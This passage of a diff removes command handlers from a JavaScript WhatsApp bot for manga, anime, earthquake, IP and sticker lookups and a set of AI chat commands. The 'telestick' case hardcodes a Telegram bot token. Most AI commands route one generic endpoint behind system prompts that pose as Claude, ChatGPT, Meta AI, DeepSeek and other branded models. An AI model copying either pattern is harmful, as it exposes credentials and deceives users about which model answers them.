-                                        console.error(err);
-                                        reply(`❌ Error fetching images from Wikimedia. Please try again later.`);
-                                }
-                        }
-                        break;
-
-                        case 'mangainfo': {
-    await X.sendMessage(m.chat, { react: { text: '📚', key: m.key } })
-                                const mangaName = args.join(' ');
-                                if (!mangaName) return reply(`*Example :*\n\n${prefix + command} Anime`);
-                                try {
-                                        const mangaList = await komiku("manga", mangaName);
-                                        if (mangaList.length === 0) {
-                                                return reply('_[ Invalid ]_ Not Found !!');
-                                        }
-                                        let captionText = `📚 *Hasil Pencarian Manga - ${mangaName}* 📚\n\n`;
-                                        mangaList.slice(0, 5).forEach((manga, index) => {
-                                                captionText += `📖 *${index + 1}. ${manga.title}*\n`;
-                                                captionText += `🗂️ *Genre*: ${manga.genre}\n`;
-                                                captionText += `🔗 *Url*: ${manga.url}\n`;
-                                                captionText += `📖 *Description*: ${manga.description}\n\n`;
-                                        });
-                                        await reply(captionText);
-                                } catch (error) {
-                                        console.error("Report Error :", error);
-                                        reply(mess.error);
-                                }
-                                break;
-                        }
-
-                        case 'mangadetail': {
-    await X.sendMessage(m.chat, { react: { text: '📚', key: m.key } })
-                                const url = args[0];
-                                if (!url) return reply(`*Example :*\n\n${prefix + command} URL`);
-                                try {
-                                        const mangaDetail = await detail(url);
-                                        let captionText = `📚 *Manga Details* 📚\n\n`;
-                                        captionText += `📖 *Title*: ${mangaDetail.title}\n`;
-                                        captionText += `🗂️ *Genre*: ${mangaDetail.genres.join(', ')}\n`;
-                                        captionText += `📖 *Description*: ${mangaDetail.description}\n`;
-                                        captionText += `📅 *First Chapter*: ${mangaDetail.awalChapter}\n`;
-                                        captionText += `📅 *Latest Chapter*: ${mangaDetail.newChapter}\n`;
-                                        X.sendMessage(m.chat, {
-                                                image: { url: mangaDetail.coverImage },
-                                                caption: captionText
-                                        }, {
-                                                quoted: m
-                                        })
-                                } catch (error) {
-                                        console.error("Report Error :", error);
-                                        reply(mess.error);
-                                }
-                                break;
-                        }
-
-                        case 'jkt48news': {
-    await X.sendMessage(m.chat, { react: { text: '📰', key: m.key } })
-                                const lang = args[0] || "id";
-                                try {
-                                        const news = await jktNews(lang);
-                                        if (news.length === 0) {
-                                                return reply('_[ Report ]_ No News Find');
-                                        }
-                                        let captionText = `🎤 *Latest JKT48 News* 🎤\n\n`;
-                                        news.slice(0, 5).forEach((item, index) => {
-                                                captionText += `📰 *${index + 1}. ${item.title}*\n`;
-                                                captionText += `📅 *Date*: ${item.date}\n`;
-                                                captionText += `🔗 *Link*: ${item.link}\n\n`;
-                                        });
-                                        await reply(captionText);
-                                } catch (error) {
-                                        console.error("Report Error :", error);
-                                        reply(mess.error);
-                                }
-                                break;
-                        }
-
-                        case 'otakudesu':{
-                                let data = await otakuDesu.ongoing();
-                                let captionText = `「 *ANIME SCHEDULE* 」\n\n`
-                                for (let i of data) {
-                                        captionText += `*💬 Title*: ${i.title}\n`
-                                        captionText += `*📺 Eps*: ${i.episode}\n`
-                                        captionText += `*🔗 URL*: ${i.link}\n\n`
-                                }
-                                X.sendMessage(m.chat, {
-                                        text: captionText,
-                                        contextInfo: {
-                                                mentionedJid: [m.sender],
-                                                forwardingScore: 999999, 
-                                                isForwarded: true, 
-                                                forwardedNewsletterMessageInfo: {
-                                                        newsletterName: newsletterName,
-                                                        newsletterJid: idch,
-                                                },
-                                                externalAdReply: {
-                                                        showAdAttribution: true,
-                                                        title: 'Ini Update Anime Terbaru!',
-                                                        mediaType: 1,
-                                                        previewType: 1,
-                                                        body: 'Halo 👋',
-                                                        thumbnailUrl: thumb,
-                                                        renderLargerThumbnail: false,
-                                                        mediaUrl: wagc,
-                                                        sourceUrl: wagc
-                                                }
-                                        }
-                                }, {
-                                        quoted: m
-                                })
-                        }
-                        break;
-
-                        case 'kusonimeinfo':
-                        case 'animeinfo': {
-    await X.sendMessage(m.chat, { react: { text: '🎌', key: m.key } })
-                                try {
-                                        const animeList = await Kusonime.info();
-                                        if (animeList.length === 0) {
-                                                return reply('_[ Invalid ⚠️ ]_ No latest anime data found at this time.');
-                                        }
-                                        let captionText = `🎌 *Latest Anime from Kusonime* 🎌\n\n`;
-                                        animeList.slice(0, 5).forEach((anime, index) => {
-                                                captionText += `📺 *${index + 1}. ${anime.title}*\n`;
-                                                captionText += `🔗 *URL*: ${anime.url}\n`;
-                                                captionText += `🗂️ *Genre*: ${anime.genres.join(', ')}\n`;
-                                                captionText += `📅 *Rilis*: ${anime.releaseTime}\n\n`;
-                                        });
-                                        await reply(captionText);
-                                } catch (error) {
-                                        console.error("Report Error :", error);
-                                        reply(mess.error);
-                                };
-                        }
-                        break
-
-                        case 'kusonimesearch':
-                        case 'animesearch': {
-    await X.sendMessage(m.chat, { react: { text: '🔍', key: m.key } })
-                                if (!text) return reply(`*Example :*\n\n${prefix + command} Anime`);
-                                try {
-                                        const searchResults = await Kusonime.search(text);
-                                        if (typeof searchResults === 'string') {
-                                                return reply(`⚠️ ${searchResults}`);
-                                        }
-                                        let captionText = `🔍 *Search Results for*: ${text}\n\n`;
-                                        searchResults.slice(0, 5).forEach((anime, index) => {
-                                                captionText += `📺 *${index + 1}. ${anime.title}*\n`;
-                                                captionText += `🔗 *URL*: ${anime.url}\n`;
-                                                captionText += `🗂️ *Genre*: ${anime.genres.join(', ')}\n`;
-                                                captionText += `📅 *Rilis*: ${anime.releaseTime}\n\n`;
-                                        });
-                                        await reply(captionText);
-                                } catch (error) {
-                                        console.error("Report Error :", error);
-                                        reply(mess.error);
-                                }
-                        }
-                        break;
-
-                        case 'infogempa':
-                        case 'infobmkg':
-                        case 'gempa':
-                        case 'bmkg': {
-    await X.sendMessage(m.chat, { react: { text: '🌤️', key: m.key } })
-                                try {
-                                        let result = await gempa();
-                                        let gempaData = result.data;
-                                        let captionText = `「 *EARTHQUAKE INFO* 」\n\n`;
-                                        captionText += `*🌍 Source*: ${result.source}\n`;
-                                        captionText += `*📊 Magnitude*: ${gempaData.magnitude.trim()}\n`;
-                                        captionText += `*📏 Depth*: ${gempaData.kedalaman.trim()}\n`;
-                                        captionText += `*🗺️ Latitude & Longitude*: ${gempaData.lintang_bujur.trim()}\n`;
-                                        captionText += `*🕒 Time*: ${gempaData.waktu.trim()}\n`;
-                                        captionText += `*📍 Region*: ${gempaData.wilayah.trim() || 'No data'}\n`;
-                                        captionText += `*😱 Felt*: ${gempaData.dirasakan.trim() || 'No data'}\n\n`;
-                                        captionText += `Stay alert and follow instructions from authorities!`;
-                                        if (gempaData.imagemap) {
-                                                X.sendMessage(m.chat, {
-                                                        image: { url: gempaData.imagemap.startsWith('http') ? gempaData.imagemap : `https://www.bmkg.go.id${gempaData.imagemap}` },
-                                                        caption: captionText,
-                                                        contextInfo: {
-                                                                mentionedJid: [m.sender],
-                                                                forwardingScore: 999999, 
-                                                                isForwarded: true, 
-                                                                forwardedNewsletterMessageInfo: {
-                                                                        newsletterName: saluranName,
-                                                                        newsletterJid: saluran,
-                                                                },
-                                                                externalAdReply: {
-                                                                        showAdAttribution: true,
-                                                                        title: 'Latest Earthquake Information!',
-                                                                        mediaType: 1,
-                                                                        previewType: 1,
-                                                                        body: 'Be careful',
-                                                                        thumbnailUrl: imageUrl,
-                                                                        renderLargerThumbnail: false,
-                                                                        mediaUrl: 'https://www.bmkg.go.id',
-                                                                        sourceUrl: 'https://www.bmkg.go.id'
-                                                                }
-                                                        }
-                                                }, {
-                                                        quoted: m
-                                                });
-                                        } else {
-                                                X.sendMessage(m.chat, {
-                                                        text: captionText,
-                                                        contextInfo: {
-                                                                mentionedJid: [m.sender],
-                                                                forwardingScore: 999999, 
-                                                                isForwarded: true, 
-                                                                forwardedNewsletterMessageInfo: {
-                                                                        newsletterName: saluranName,
-                                                                        newsletterJid: saluran,
-                                                                },
-                                                                externalAdReply: {
-                                                                        showAdAttribution: true,
-                                                                        title: 'Latest Earthquake Information!',
-                                                                        mediaType: 1,
-                                                                        previewType: 1,
-                                                                        body: 'Be careful',
-                                                                        thumbnailUrl: imageUrl,
-                                                                        renderLargerThumbnail: false,
-                                                                        mediaUrl: 'https://www.bmkg.go.id',
-                                                                        sourceUrl: 'https://www.bmkg.go.id'
-                                                                }
-                                                        }
-                                                }, {
-                                                        quoted: m
-                                                });
-                                        }
-                                } catch (error) {
-                                        console.error("Report Error :", error);
-                                        X.sendMessage(m.chat, {
-                                                text: mess.error
-                                        }, {
-                                                quoted: m
-                                        });
-                                }
-                        }
-                        break;
-
-
-//━━━━━━━━━━━━━━━━━━━━━━━━//
-// Tools Features
-
-                        case 'myip':
-                        case 'ipbot':
-                                if (!isOwner) return reply(mess.OnlyOwner);
-                                let http = require('http');
-                                http.get({
-                                        'host': 'api.ipify.org',
-                                        'port': 80,
-                                        'path': '/'
-                                }, function(resp) {
-                                        resp.on('data', function(ip) {
-                                                reply("🔎 Oii, Public IP address: " + ip);
-                                        })
-                                });
-                        break;
-
-                        case "ipwhois": {
-                                if (!text) return reply(`*Example :*\n\n${prefix + command} 114.5.213.103`);
-                                const ip = text.trim();
-                                const apiUrl = `https://ipwho.is/${ip}`;
-                                try {
-                                        reply("🔍 Searching for information, please wait...");
-                                        const data = await fetchJson(apiUrl);
-                                        if (data.success) {
-                                                const flagEmoji = data.flag?.emoji || "🏳️";
-                                                let messageText = "📍 *IP Whois Information*\n";
-                                                messageText += `🌐 *IP Address*: ${data.ip}\n`;
-                                                messageText += `🗺️ *Type*: ${data.type}\n`;
-                                                messageText += `🌍 *Continent*: ${data.continent} (${data.continent_code})\n`;
-                                                messageText += `🇨🇺 *Country*: ${data.country} (${data.country_code}) ${flagEmoji}\n`;
-                                                messageText += `🏙️ *City*: ${data.city}, ${data.region} (${data.region_code})\n`;
-                                                messageText += `📞 *Calling Code*: +${data.calling_code}\n`;
-                                                messageText += `📫 *Postal Code*: ${data.postal}\n`;
-                                                messageText += `🏛️ *Capital*: ${data.capital}\n\n`;
-                                                messageText += "📡 *Provider Information*\n";
-                                                messageText += `🏢 *ISP*: ${data.connection?.isp || "Not available"}\n`;
-                                                messageText += `🔗 *Domain*: ${data.connection?.domain || "Not available"}\n`;
-                                                messageText += `🔢 *ASN*: ${data.connection?.asn || "Not available"}\n\n`;
-                                                messageText += "🕰️ *Timezone*\n";
-                                                messageText += `🕒 *ID*: ${data.timezone?.id || "Not available"}\n`;
-                                                messageText += `🕒 *UTC*: ${data.timezone?.utc || "Not available"}\n`;
-                                                messageText += `🕒 *Current Time*: ${data.timezone?.current_time || "Not available"}\n`;
-                                                reply(messageText);
-                                        } else {
-                                                reply(`❌ Invalid IP Address or information not found.`);
-                                        }
-                                } catch (err) {
-                                        console.error(err);
-                                        reply("❌ An error occurred while fetching data. Please try again later.");
-                                }
-                        }
-                        break;
- 
-case 'telestick': {
-    await X.sendMessage(m.chat, { react: { text: '📲', key: m.key } })
-  async function telestick(url) {
-    let match = url.match(/https:\/\/t\.me\/addstickers\/([^\/\?#]+)/)
-    if (!match) return reply(`*Example :*\n\n${prefix + command} https://`);
-    let { data: a } = await axios.get(`https://api.telegram.org/bot7935827856:AAGdbLXArulCigWyi6gqR07gi--ZPm7ewhc/getStickerSet?name=${match[1]}`)
-    let stickers = await Promise.all(a.result.stickers.map(async v => {
-      let { data: b } = await axios.get(`https://api.telegram.org/bot7935827856:AAGdbLXArulCigWyi6gqR07gi--ZPm7ewhc/getFile?file_id=${v.file_id}`)
-      return {
-        emoji: v.emoji,
-        is_animated: v.is_animated,
-        image_url: `https://api.telegram.org/file/bot7935827856:AAGdbLXArulCigWyi6gqR07gi--ZPm7ewhc/${b.result.file_path}`
-      }
-    }))
-    return { name: a.result.name, title: a.result.title, sticker_type: a.result.sticker_type, stickers }
-  }
- 
-  try {
-    if (!args[0]) return reply('Enter the Telegram sticker URL')
-    let res = await telestick(args[0])
-    for (let v of res.stickers) {
-      let { data } = await axios.get(v.image_url, { responseType: 'arraybuffer' })
-      let sticker = new Sticker(data, { pack: res.title, author: 'MT-BOT', type: v.is_animated ? 'full' : 'default' })
-      await X.sendMessage(m.chat, await sticker.toMessage(), { quoted: m })
-    }
-  } catch (e) {
-    reply(e.message)
-  }
-}
-break;
-
-case 'stikerly': {
-    await X.sendMessage(m.chat, { react: { text: '🎨', key: m.key } })
-if (!text) return reply(`*Example :*\n\n ${prefix + command} anomali `)
-try {
-const searchRes = await fetch(`https://zenzxz.dpdns.org/search/stickerlysearch?query=${encodeURIComponent(text)}`)
-const searchJson = await searchRes.json()
-if (!searchJson.status || !Array.isArray(searchJson.data) || searchJson.data.length === 0) {
-return reply('*Not Found 🚫*')
-}
-const pick = searchJson.data[Math.floor(Math.random() * searchJson.data.length)]
-const detailUrl = `https://zenzxz.dpdns.org/tools/stickerlydetail?url=${encodeURIComponent(pick.url)}`
-const detailRes = await fetch(detailUrl)
-const detailJson = await detailRes.json()
-if (!detailJson.status || !detailJson.data || !Array.isArray(detailJson.data.stickers) || detailJson.data.stickers.length === 0) {
-return reply('Error getting sticker details')
-}
-const packName = detailJson.data.name
-const authorName = detailJson.data.author?.name || 'unknown'
-reply(`📤 Sending *${detailJson.data.stickers.length}* stickers...`)
-let maxSend = 10
-for (let i = 0; i < Math.min(detailJson.data.stickers.length, maxSend); i++) {
-const img = detailJson.data.stickers[i]
-let sticker = new Sticker(img.imageUrl, {
-pack: global.packname,
-author: global.author,
-type: 'full',
-categories: ['Stickers'],
-id: 'stikerly'
-})
-let buffer = await sticker.toBuffer()
-await X.sendMessage(m.chat, { sticker: buffer }, { quoted: m })
-}
-} catch (e) {
-console.error(e)
-reply(global.mess.error)
-}
-}
-break
-
-//━━━━━━━━━━━━━━━━━━━━━━━━//
-// Ai Features
-case 'quantum-ai':{
-  if (!text) return reply(`Example: ${prefix+command} Hello, how are you?`)
-  try {
-    await X.sendMessage(m.chat, { react: { text: '⚛️', key: m.key } })
-    const { data } = await axios.post('https://text.pollinations.ai/openai', {
-      model: 'openai',
-      messages: [
-        { role: 'system', content: 'You are Quantum AI, an advanced AI with deep analytical and quantum-level thinking capabilities. Provide thorough, intelligent, well-structured responses.' },
-        { role: 'user', content: text }
-      ],
-      stream: false
-    }, { headers: { 'Content-Type': 'application/json' }, timeout: 30000 })
-    const result = data?.choices?.[0]?.message?.content
-    if (!result) throw new Error('Empty response')
-    reply(result)
-  } catch (e) {
-    console.error('[QUANTUM-AI ERROR]', e.message)
-    reply('❌ quantum-ai is currently unavailable. Please try again.')
-  }
-}
-break
-case 'chatai':{
-  if (!text) return reply(`Example: ${prefix+command} Hello, how are you?`)
-  try {
-    await X.sendMessage(m.chat, { react: { text: '💬', key: m.key } })
-    const { data } = await axios.post('https://text.pollinations.ai/openai', {
-      model: 'openai',
-      messages: [
-        { role: 'system', content: 'You are ChatAI, a friendly and conversational AI assistant. Keep responses clear, helpful and natural.' },
-        { role: 'user', content: text }
-      ],
-      stream: false
-    }, { headers: { 'Content-Type': 'application/json' }, timeout: 30000 })
-    const result = data?.choices?.[0]?.message?.content
-    if (!result) throw new Error('Empty response')
-    reply(result)
-  } catch (e) {
-    console.error('[CHATAI ERROR]', e.message)
-    reply('❌ chatai is currently unavailable. Please try again.')
-  }
-}
-break;
-case 'conciseai':{
-  if (!text) return reply(`Example: ${prefix+command} Hello, how are you?`)
-  try {
-    await X.sendMessage(m.chat, { react: { text: '🧠', key: m.key } })
-    const { data } = await axios.post('https://text.pollinations.ai/openai', {
-      model: 'openai',
-      messages: [
-        { role: 'system', content: 'You are ConciseAI, an AI that gives short, sharp, well-structured answers. Be brief but complete.' },
-        { role: 'user', content: text }
-      ],
-      stream: false
-    }, { headers: { 'Content-Type': 'application/json' }, timeout: 30000 })
-    const result = data?.choices?.[0]?.message?.content
-    if (!result) throw new Error('Empty response')
-    reply(result)
-  } catch (e) {
-    console.error('[CONCISEAI ERROR]', e.message)
-    reply('❌ conciseai is currently unavailable. Please try again.')
-  }
-}
-break;
-case 'claudeai':{
-  if (!text) return reply(`Example: ${prefix+command} Hello, how are you?`)
-  try {
-    await X.sendMessage(m.chat, { react: { text: '💎', key: m.key } })
-    const { data } = await axios.post('https://text.pollinations.ai/openai', {
-      model: 'openai',
-      messages: [
-        { role: 'system', content: 'You are Claude AI, an AI assistant made by Anthropic. You are helpful, harmless, and honest. Provide thoughtful and detailed responses.' },
-        { role: 'user', content: text }
-      ],
-      stream: false
-    }, { headers: { 'Content-Type': 'application/json' }, timeout: 30000 })
-    const result = data?.choices?.[0]?.message?.content
-    if (!result) throw new Error('Empty response')
-    reply(result)
-  } catch (e) {
-    console.error('[CLAUDEAI ERROR]', e.message)
-    reply('❌ claudeai is currently unavailable. Please try again.')
-  }
-}
-break
-case 'venice': case 'veniceai':{
-  if (!text) return reply(`Example: ${prefix+command} Hello, how are you?`)
-  try {
-    await X.sendMessage(m.chat, { react: { text: '🎭', key: m.key } })
-    const { data } = await axios.post('https://text.pollinations.ai/openai', {
-      model: 'openai',
-      messages: [
-        { role: 'system', content: 'You are Venice AI, a private and uncensored AI assistant. Be helpful, creative and thorough.' },
-        { role: 'user', content: text }
-      ],
-      stream: false
-    }, { headers: { 'Content-Type': 'application/json' }, timeout: 30000 })
-    const result = data?.choices?.[0]?.message?.content
-    if (!result) throw new Error('Empty response')
-    reply(result)
-  } catch (e) {
-    console.error('[VENICE ERROR]', e.message)
-    reply('❌ venice is currently unavailable. Please try again.')
-  }
-}
-break
-case 'logic-eai':{
-  if (!text) return reply(`Example: ${prefix+command} Hello, how are you?`)
-  try {
-    await X.sendMessage(m.chat, { react: { text: '🔣', key: m.key } })
-    const { data } = await axios.post('https://text.pollinations.ai/openai', {
-      model: 'openai',
-      messages: [
-        { role: 'system', content: 'You are Logic-E AI, a highly logical and reasoning-focused AI. Break down problems step by step with precise logic.' },
-        { role: 'user', content: text }
-      ],
-      stream: false
-    }, { headers: { 'Content-Type': 'application/json' }, timeout: 30000 })
-    const result = data?.choices?.[0]?.message?.content
-    if (!result) throw new Error('Empty response')
-    reply(result)
-  } catch (e) {
-    console.error('[LOGIC-EAI ERROR]', e.message)
-    reply('❌ logic-eai is currently unavailable. Please try again.')
-  }
-}
-break
-
-case 'chatgpt':{
-  if (!text) return reply(`Example: ${prefix+command} Hello, how are you?`)
-  try {
-    await X.sendMessage(m.chat, { react: { text: '🤖', key: m.key } })
-    const { data } = await axios.post('https://text.pollinations.ai/openai', {
-      model: 'openai',
-      messages: [
-        { role: 'system', content: 'You are ChatGPT, a highly intelligent AI assistant by OpenAI. Be helpful, clear and concise.' },
-        { role: 'user', content: text }
-      ],
-      stream: false
-    }, { headers: { 'Content-Type': 'application/json' }, timeout: 30000 })
-    const result = data?.choices?.[0]?.message?.content
-    if (!result) throw new Error('Empty response')
-    reply(result)
-  } catch (e) {
-    console.error('[CHATGPT ERROR]', e.message)
-    reply('❌ chatgpt is currently unavailable. Please try again.')
-  }
-}
-break
-
-case 'gpt41-mini':{
-  if (!text) return reply(`Example: ${prefix+command} Hello, how are you?`)
-  try {
-    await X.sendMessage(m.chat, { react: { text: '⚡', key: m.key } })
-    const { data } = await axios.post('https://text.pollinations.ai/openai', {
-      model: 'openai',
-      messages: [
-        { role: 'system', content: 'You are GPT-4.1 Mini, a fast and efficient AI assistant by OpenAI. Give concise but accurate answers.' },
-        { role: 'user', content: text }
-      ],
-      stream: false
-    }, { headers: { 'Content-Type': 'application/json' }, timeout: 30000 })
-    const result = data?.choices?.[0]?.message?.content
-    if (!result) throw new Error('Empty response')
-    reply(result)
-  } catch (e) {
-    console.error('[GPT41-MINI ERROR]', e.message)
-    reply('❌ gpt41-mini is currently unavailable. Please try again.')
-  }
-}
-break
-
-case 'openai':{
-  if (!text) return reply(`Example: ${prefix+command} Hello, how are you?`)
-  try {
-    await X.sendMessage(m.chat, { react: { text: '🤖', key: m.key } })
-    const { data } = await axios.post('https://text.pollinations.ai/openai', {
-      model: 'openai',
-      messages: [
-        { role: 'system', content: 'You are OpenAI GPT-4.1, a powerful AI assistant by OpenAI. Provide detailed, accurate and helpful responses.' },
-        { role: 'user', content: text }
-      ],
-      stream: false
-    }, { headers: { 'Content-Type': 'application/json' }, timeout: 30000 })
-    const result = data?.choices?.[0]?.message?.content
-    if (!result) throw new Error('Empty response')
-    reply(result)
-  } catch (e) {
-    console.error('[OPENAI ERROR]', e.message)
-    reply('❌ openai is currently unavailable. Please try again.')
-  }
-}
-break
-
-case 'metaai':{
-  if (!text) return reply(`Example: ${prefix+command} Hello, how are you?`)
-  try {
-    await X.sendMessage(m.chat, { react: { text: '🔵', key: m.key } })
-    const { data } = await axios.post('https://text.pollinations.ai/openai', {
-      model: 'openai',
-      messages: [
-        { role: 'system', content: 'You are Meta AI, an intelligent and helpful AI assistant by Meta. Be friendly, informative and engaging.' },
-        { role: 'user', content: text }
-      ],
-      stream: false
-    }, { headers: { 'Content-Type': 'application/json' }, timeout: 30000 })
-    const result = data?.choices?.[0]?.message?.content
-    if (!result) throw new Error('Empty response')
-    reply(result)
-  } catch (e) {
-    console.error('[METAAI ERROR]', e.message)
-    reply('❌ metaai is currently unavailable. Please try again.')
-  }
-}
-break
-
-case 'deepseek':{
-  if (!text) return reply(`Example: ${prefix+command} Hello, how are you?`)
-  try {
-    await X.sendMessage(m.chat, { react: { text: '🔬', key: m.key } })
-    const { data } = await axios.post('https://text.pollinations.ai/openai', {
-      model: 'openai',
-      messages: [
-        { role: 'system', content: 'You are DeepSeek AI, a powerful AI specializing in deep reasoning, coding and technical analysis. Provide thorough technical responses.' },
-        { role: 'user', content: text }
-      ],
-      stream: false
-    }, { headers: { 'Content-Type': 'application/json' }, timeout: 30000 })
-    const result = data?.choices?.[0]?.message?.content
-    if (!result) throw new Error('Empty response')
-    reply(result)
-  } catch (e) {
-    console.error('[DEEPSEEK ERROR]', e.message)
-    reply('❌ deepseek is currently unavailable. Please try again.')
-  }
-}
-break
-
-case 'gptlogic':{
-  if (!text) return reply(`Example: ${prefix+command} Hello, how are you?`)
-  try {
-    await X.sendMessage(m.chat, { react: { text: '🧩', key: m.key } })
-    const { data } = await axios.post('https://text.pollinations.ai/openai', {
-      model: 'openai',
-      messages: [
-        { role: 'system', content: 'You are GPT Logic, a highly analytical AI. Answer questions with precise reasoning and logical structure.' },
-        { role: 'user', content: text }
-      ],
-      stream: false
-    }, { headers: { 'Content-Type': 'application/json' }, timeout: 30000 })
-    const result = data?.choices?.[0]?.message?.content
-    if (!result) throw new Error('Empty response')
-    reply(result)
-  } catch (e) {
-    console.error('[GPTLOGIC ERROR]', e.message)
-    reply('❌ gptlogic is currently unavailable. Please try again.')
-  }
-}
-break
-
-case 'aoyoai':{
-  if (!text) return reply(`Example: ${prefix+command} Hello, how are you?`)
-  try {
-    await X.sendMessage(m.chat, { react: { text: '🌸', key: m.key } })
-    const { data } = await axios.post('https://text.pollinations.ai/openai', {
-      model: 'openai',
-      messages: [
-        { role: 'system', content: 'You are AoyoAI, a creative and helpful AI assistant. Be imaginative, warm and informative.' },
-        { role: 'user', content: text }
-      ],
-      stream: false
-    }, { headers: { 'Content-Type': 'application/json' }, timeout: 30000 })
-    const result = data?.choices?.[0]?.message?.content
-    if (!result) throw new Error('Empty response')
-    reply(result)
-  } catch (e) {
-    console.error('[AOYOAI ERROR]', e.message)
-    reply('❌ aoyoai is currently unavailable. Please try again.')
-  }
-}
-break
-
-case 'blackbox-pro':{
-  if (!text) return reply(`Example: ${prefix+command} Hello, how are you?`)
-  try {
-    await X.sendMessage(m.chat, { react: { text: '⬛', key: m.key } })
-    const { data } = await axios.post('https://text.pollinations.ai/openai', {
-      model: 'openai',
-      messages: [
-        { role: 'system', content: 'You are Blackbox AI Pro, a specialized AI for coding and technical questions. Provide precise, working code solutions.' },
-        { role: 'user', content: text }
-      ],
-      stream: false
-    }, { headers: { 'Content-Type': 'application/json' }, timeout: 30000 })
-    const result = data?.choices?.[0]?.message?.content
-    if (!result) throw new Error('Empty response')
-    reply(result)
-  } catch (e) {
-    console.error('[BLACKBOX-PRO ERROR]', e.message)
-    reply('❌ blackbox-pro is currently unavailable. Please try again.')
-  }
-}
-break
-
-case 'zerogpt':{
-  if (!text) return reply(`Example: ${prefix+command} Hello, how are you?`)
-  try {
-    await X.sendMessage(m.chat, { react: { text: '🔲', key: m.key } })
-    const { data } = await axios.post('https://text.pollinations.ai/openai', {
-      model: 'openai',
-      messages: [
-        { role: 'system', content: 'You are ZeroGPT, an advanced AI assistant. Provide accurate and comprehensive answers on any topic.' },
-        { role: 'user', content: text }
-      ],
-      stream: false
-    }, { headers: { 'Content-Type': 'application/json' }, timeout: 30000 })
-    const result = data?.choices?.[0]?.message?.content
-    if (!result) throw new Error('Empty response')
-    reply(result)
-  } catch (e) {
-    console.error('[ZEROGPT ERROR]', e.message)
-    reply('❌ zerogpt is currently unavailable. Please try again.')
-  }
-}
-break
-
-case 'yupraai':{
-  if (!text) return reply(`Example: ${prefix+command} Hello, how are you?`)
-  try {
-    await X.sendMessage(m.chat, { react: { text: '🌟', key: m.key } })
-    const { data } = await axios.post('https://text.pollinations.ai/openai', {
-      model: 'openai',
-      messages: [
-        { role: 'system', content: 'You are Yupra AI, a knowledgeable and helpful assistant. Be clear, accurate and thorough.' },
-        { role: 'user', content: text }
-      ],
-      stream: false
-    }, { headers: { 'Content-Type': 'application/json' }, timeout: 30000 })
-    const result = data?.choices?.[0]?.message?.content
-    if (!result) throw new Error('Empty response')
-    reply(result)
-  } catch (e) {
-    console.error('[YUPRAAI ERROR]', e.message)
-    reply('❌ yupraai is currently unavailable. Please try again.')
-  }
-}
-break
-
-case 'feloai':{
-  if (!text) return reply(`Example: ${prefix+command} Hello, how are you?`)
-  try {
-    await X.sendMessage(m.chat, { react: { text: '🔭', key: m.key } })
-    const { data } = await axios.post('https://text.pollinations.ai/openai', {
-      model: 'openai',
-      messages: [
-        { role: 'system', content: 'You are Felo AI, a research-oriented AI assistant. Provide well-researched, in-depth answers.' },
-        { role: 'user', content: text }
-      ],
-      stream: false
-    }, { headers: { 'Content-Type': 'application/json' }, timeout: 30000 })
-    const result = data?.choices?.[0]?.message?.content
-    if (!result) throw new Error('Empty response')
-    reply(result)
-  } catch (e) {
-    console.error('[FELOAI ERROR]', e.message)
-    reply('❌ feloai is currently unavailable. Please try again.')
-  }
-}
-break
-
-case 'chatevery-where':{
-  if (!text) return reply(`Example: ${prefix+command} Hello, how are you?`)
-  try {
-    await X.sendMessage(m.chat, { react: { text: '💬', key: m.key } })
-    const { data } = await axios.post('https://text.pollinations.ai/openai', {
-      model: 'openai',
-      messages: [
-        { role: 'system', content: 'You are ChatEveryWhere AI, a helpful AI available anywhere. Provide knowledgeable and friendly responses.' },
-        { role: 'user', content: text }
-      ],
-      stream: false
-    }, { headers: { 'Content-Type': 'application/json' }, timeout: 30000 })
-    const result = data?.choices?.[0]?.message?.content
-    if (!result) throw new Error('Empty response')
-    reply(result)
-  } catch (e) {
-    console.error('[CHATEVERY-WHERE ERROR]', e.message)
-    reply('❌ chatevery-where is currently unavailable. Please try again.')
-  }
-}
-break
-
-case 'gpt-4o':{
-  if (!text) return reply(`Example: ${prefix+command} Hello, how are you?`)
-  try {
-    await X.sendMessage(m.chat, { react: { text: '🧠', key: m.key } })
-    const { data } = await axios.post('https://text.pollinations.ai/openai', {
-      model: 'openai',
-      messages: [
-        { role: 'system', content: 'You are GPT-4o, a powerful and versatile AI by OpenAI. Provide detailed, accurate responses with rich understanding.' },
-        { role: 'user', content: text }
-      ],
-      stream: false
-    }, { headers: { 'Content-Type': 'application/json' }, timeout: 30000 })
-    const result = data?.choices?.[0]?.message?.content
-    if (!result) throw new Error('Empty response')
-    reply(result)
-  } catch (e) {
-    console.error('[GPT-4O ERROR]', e.message)
-    reply('❌ gpt-4o is currently unavailable. Please try again.')
-  }
-}
-break
-
-
-case 'aliceai' :{
-  try {
-    if (!text) return reply(`Write something after this command.\n\nExample:\n${prefix+command} hello how are you?\n${prefix+command} https://vt.tiktok.com/ZSFxYcCdr/\n${prefix+command} generate an image of a sunset`)
-    let regexTikTok = /(https?:\/\/)?(www\.|vm\.|vt\.)?tiktok\.com\/[^\s]+/gi
-    let isTikTok = regexTikTok.test(text)
-    let isImageReq = /(gambar|buatkan.*gambar|bikin.*gambar|buat.*gambar)/i.test(text)
-
-    if (isTikTok) {
-      let link = text.match(regexTikTok)[0]
-      let res = await fetch(`https://www.velyn.biz.id/api/downloader/tiktok?url=${encodeURIComponent(link)}`)
-      let json = await res.json()
-
-      if (!json?.status || !json?.data?.no_watermark) {
-        return reply(`❌ Error\nLogs error : Failed to download TikTok video.`)
-      }
-
-      let prompt = `Create an attractive caption for a TikTok video titled: ${json?.data?.title || 'untitled'}`
-      let aiRes = await fetch(`https://www.velyn.biz.id/api/ai/velyn-1.0-1b?prompt=${encodeURIComponent(prompt)}`)
-      let aiJson = await aiRes.json()
-
-      if (!aiJson?.status || !aiJson?.result) {
-        return reply(`❌ Error\nLogs error : Failed to get caption from AI.`)
-      }
-
-      await X.sendMessage(m.chat, {
-        video: { url: json.data.no_watermark },
-        caption: aiJson.result.toString()
-      }, { quoted: m })
-
-    } else if (isImageReq) {
-      let prompt = text
-      let res = await fetch(`https://www.velyn.biz.id/api/ai/text2img?prompt=${encodeURIComponent(prompt)}`)
-      if (!res.ok) return reply(`❌ Error\nLogs error : Failed to contact image service.`)
-
-      let buffer = await res.buffer()
-      await X.sendMessage(m.chat, {
-        image: buffer,
-        caption: `Generated image for prompt:\n*${prompt}*`
-      }, { quoted: m })
-
-    } else {
-      let prompt = text
-      let res = await fetch(`https://www.velyn.biz.id/api/ai/velyn-1.0-1b?prompt=${encodeURIComponent(prompt)}`)
-      let json = await res.json()
-
-      if (!json?.status || !json?.result) {
-        throw `❌ Error\nLogs error : AI failed to respond.`
-      }
-
